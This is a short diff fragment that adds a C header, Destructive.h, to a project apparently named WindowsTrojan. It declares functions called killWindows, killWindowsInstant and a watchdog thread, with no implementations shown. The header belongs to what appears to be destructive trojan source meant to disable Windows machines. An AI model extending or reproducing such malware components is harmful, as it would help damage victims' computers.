+++ WindowsTrojan/Source/Destructive/Destructive.h
@@ -1,0 +1,4 @@
+void killWindows();
+void killWindowsInstant();
+
+DWORD WINAPI watchdogThread(LPVOID);
